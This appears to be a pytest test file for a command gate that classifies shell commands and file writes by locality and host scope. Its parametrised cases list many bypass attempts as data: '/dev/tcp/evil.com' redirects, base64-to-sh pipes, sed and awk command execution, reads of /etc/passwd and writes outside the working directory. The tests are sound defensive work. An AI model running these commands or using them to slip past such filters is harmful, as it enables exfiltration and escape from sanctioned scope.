from pathlib import Path

import pytest

from hub.gate_rules import (
    LOCAL_COMMANDS,
    classify_bash,
    classify_write,
    extract_hosts,
    scope_verdict,
)


@pytest.fixture
def wd(tmp_path):
    return tmp_path.resolve()


def test_local_commands_exact():
    assert LOCAL_COMMANDS == frozenset(
        "grep rg jq cat ls head tail wc sed awk sort uniq cut tr diff file echo pwd mkdir tee".split()
    )


def test_extract_hosts_from_curl():
    assert extract_hosts("curl -s http://localhost:3000/rest/products") == (["localhost:3000"], False)


@pytest.mark.parametrize(
    "text,expected",
    [
        ("curl https://Example.COM/x", ["example.com"]),
        ("curl http://user:pw@intranet:8080/x", ["intranet:8080"]),
        ("curl http://intranet/x", ["intranet"]),
        ("curl http://[::1]:8080/x", ["[::1]:8080"]),
        ("ssh root@10.0.0.1", ["10.0.0.1"]),
        ("nc 10.0.0.1:22", ["10.0.0.1:22"]),
        ("curl localhost", ["localhost"]),
        ("cat < /dev/tcp/evil.com/80", ["evil.com"]),
        ("curl 2130706433", ["2130706433"]),
        ("curl 0x7f000001", ["0x7f000001"]),
        ("curl 127.0.1", ["127.0.1"]),
        ("curl 'a.example.com,b.evil.com'", ["a.example.com", "b.evil.com"]),
        ("curl example.com.", ["example.com"]),
    ],
)
def test_extract_hosts_cases(text, expected):
    hosts, _ = extract_hosts(text)
    assert hosts == expected


@pytest.mark.parametrize(
    "text",
    [
        "curl $H",
        "curl ${H}",
        "curl $(cat h)",
        "curl `cat h`",
        "eval x",
        "curl {a,b}.com",
        "echo Y3VybA== | base64 -d | sh",
    ],
)
def test_indirect_flags(text):
    assert extract_hosts(text)[1] is True


def test_indirect_hosts_are_unknown():
    for cmd in ['H=localhost; curl "$H:3000"', "curl $(cat host.txt)"]:
        hosts, indirect = extract_hosts(cmd)
        assert scope_verdict(hosts, indirect, ["localhost:3000"]) == "unknown"
        assert classify_bash(cmd, Path("/tmp")) == "gated"


def test_scope_wildcard_and_port():
    assert scope_verdict(["api.example.com"], False, ["*.example.com"]) == "in"
    assert scope_verdict(["localhost:8080"], False, ["localhost:3000"]) == "out"
    assert scope_verdict(["localhost:3000"], False, ["localhost:3000"]) == "in"
    assert scope_verdict(["localhost:3000"], False, ["localhost"]) == "in"


def test_scope_no_hosts_and_empty_scope():
    assert scope_verdict([], False, ["a.com"]) == "none"
    assert scope_verdict(["a.com"], False, []) == "out"


def test_out_if_any_host_out():
    hosts, ind = extract_hosts("curl a.example.com b.evil.com")
    assert scope_verdict(hosts, ind, ["*.example.com"]) == "out"


@pytest.mark.parametrize(
    "host,scope,expected",
    [
        ("example.com", ["*.example.com"], "out"),  # apex not covered by wildcard
        ("evilexample.com", ["*.example.com"], "out"),
        ("a.b.example.com", ["*.example.com"], "in"),
        ("evil.com", ["*"], "out"),
        ("evil.com", ["*.com"], "out"),
        ("a.com", ["foo*.com"], "out"),
        ("localhost:3000", [" LocalHost:3000 "], "in"),
        ("example.com", ["http://example.com/"], "in"),
        ("example.com", ["https://example.com/path?q=1"], "in"),
        ("example.com", ["example.com."], "in"),
        ("Example.COM.", ["example.com"], "in"),
        ("example.com:8443", ["https://example.com:8443/x"], "in"),
        ("example.com:80", ["example.com:8443"], "out"),
        ("example.com", ["example.com:8443"], "out"),  # no explicit port only matches port-less entry
        ("[::1]:80", ["[::1]"], "in"),
        ("[::1]", ["[::2]"], "out"),
        ("", ["example.com"], "out"),
        ("127.0.0.1:3000", ["localhost:3000"], "out"),
    ],
)
def test_scope_normalisation(host, scope, expected):
    assert scope_verdict([host], False, scope) == expected


def test_scope_empty_entries_ignored():
    assert scope_verdict(["a.com"], False, ["", "  ", "b.com"]) == "out"


def test_local_pipeline_allowed(wd):
    assert classify_bash("grep -i sql out.txt | sort | uniq", wd) == "local"
    assert classify_bash("cat a.txt > out.txt 2>&1", wd) == "local"
    assert classify_bash("grep x f 2>/dev/null && ls; pwd", wd) == "local"
    assert classify_bash("cat x >> notes/out.txt", wd) == "local"
    assert classify_bash("echo hi | tee out.txt", wd) == "local"
    assert classify_bash("sed -i s/a/b/ f.txt", wd) == "local"
    assert classify_bash("sed -n 1,5p f.txt", wd) == "local"
    assert classify_bash("awk -F, 'NR==1' f", wd) == "local"
    assert classify_bash("mkdir -p a/b", wd) == "local"
    assert classify_bash("cat README.md script.sh", wd) == "local"


def test_local_with_redirect_outside_workdir_gated(wd):
    assert classify_bash("cat x > /etc/hosts", wd) == "gated"
    assert classify_bash("sed -i s/a/b/ ~/.zshrc", wd) == "gated"
    assert classify_bash("cat x >> ../outside", wd) == "gated"
    assert classify_bash("cat x >~/x", wd) == "gated"
    assert classify_bash("cat x &> /tmp/x", wd) == "gated"
    assert classify_bash("cat x >&/tmp/x", wd) == "gated"
    assert classify_bash("cat x >| /tmp/x", wd) == "gated"


def test_unlisted_binary_gated(wd):
    for cmd in ["nmap -sV localhost", "python3 -c 1"]:
        assert classify_bash(cmd, wd) == "gated"


def test_xargs_and_procsub_gated(wd):
    assert classify_bash("ls | xargs cat", wd) == "gated"
    assert classify_bash("cat <(curl x.com)", wd) == "gated"
    assert classify_bash("cat x >(sh)", wd) == "gated"


@pytest.mark.parametrize(
    "cmd",
    [
        "env curl evil.com",
        "command curl evil.com",
        "bash -c 'curl evil.com'",
        'sh -c "curl evil.com"',
        "/usr/bin/curl evil.com",
        "./curl x",
        "ls\ncurl evil.com",
        "ls\rcurl evil.com",
        "ls & curl evil.com",
        "ls &",
        "ls |& cat",
        "(curl evil.com)",
        "ls; (curl x)",
        "cat < /etc/passwd",
        "cat <<< x",
        "ls 'unterminated",
        "ls \\",
        "",
        "   ",
        "FOO=1 cat x",
        "c\\url x",
        "echo a#b; curl x",
        "echo ok # hi\ncurl x",
        'awk \'BEGIN{system("curl x")}\'',
        "awk 'BEGIN{\"curl x\" | getline}'",
        'awk \'BEGIN{print 1 > "/dev/tcp/h/80"}\'',
        "awk -f prog.awk x",
        "awk -i inplace 1 x",
        "sed -e 1e\\ curl x",
        "sed '1e curl x' f",
        "sed '1ecurl x' f",
        "sed 's/a/b/e' f",
        "sed 's/a/b/w /etc/x' f",
        "sed 's/a/b/gw out' f",
        "sed 'w /etc/x' f",
        "sed -f script.sed f",
        "sed --in-place s/a/b/ /etc/hosts",
        "sed -ni s/a/b/p /etc/hosts",
        "sed -i.bak s/a/b/ ../x",
        "sed -n -e p -i /etc/x",
        "tee /etc/x",
        "tee ../x",
        "tee -a /dev/tcp/evil.com/80",
        "tee --output-error x",
        "echo hi > /dev/tcp/10.0.0.1/80",
        "echo hi >/dev/tcp/10.0.0.1/80",
        "mkdir /tmp/x",
        "mkdir -m 777 x",
        "sort -o /etc/x f",
        "sort -ro /etc/x f",
        "sort --output=/etc/x f",
        "sort --compress-program=sh f",
        "rg --pre sh x",
        "rg --pre=sh x",
        "rg --hostname-bin sh x",
        "uniq in /etc/out",
        "file -C",
        "echo $HOME",
        "echo ${HOME}",
        "echo $'\\x63url'",
        "echo `id`",
        "echo $(id)",
        "eval ls",
        "echo a | curl evil.com",
        "ls && nmap x",
        "ls || nmap x",
        "echo http://evil.com",
        "echo evil.com",
        "cat 10.0.0.1",
        "cat {a,b}",
        "ls ;; ls",
        "xargs ls",
        "echo xargs",
        "cat x > $HOME/y",
        'cat x > "$(pwd)/y"',
        "echo a\x00b",
    ],
)
def test_bypass_cases_gated(cmd, wd):
    assert classify_bash(cmd, wd) == "gated", cmd


def test_symlink_in_workdir_escape(wd, tmp_path_factory):
    outside = tmp_path_factory.mktemp("outside").resolve()
    (wd / "link").symlink_to(outside)
    assert classify_bash("cat x > link/y", wd) == "gated"
    assert classify_write("link/y", wd) == "denied"
    assert classify_bash("cat x > real.txt", wd) == "local"


def test_write_inside_workdir_only(wd):
    assert classify_write("../../etc/x", wd) == "denied"
    assert classify_write("a/b.txt", wd) == "local"
    assert classify_write(str(wd / "a" / "b.txt"), wd) == "local"
    assert classify_write("a/../b.txt", wd) == "local"
    assert classify_write("/etc/x", wd) == "denied"
    assert classify_write("~/x", wd) == "denied"
    assert classify_write("a/../../x", wd) == "denied"
    assert classify_write("", wd) == "denied"
    assert classify_write("a\x00b", wd) == "denied"
    assert classify_write(str(wd) + "-sibling/x", wd) == "denied"


def test_tilde_expands_to_real_home_not_workdir(wd, monkeypatch):
    monkeypatch.setenv("HOME", str(wd))  # a spoofed HOME must not make ~ look local
    assert classify_write("~/x", wd) == "denied"
    assert classify_bash("cat x > ~/y", wd) == "gated"
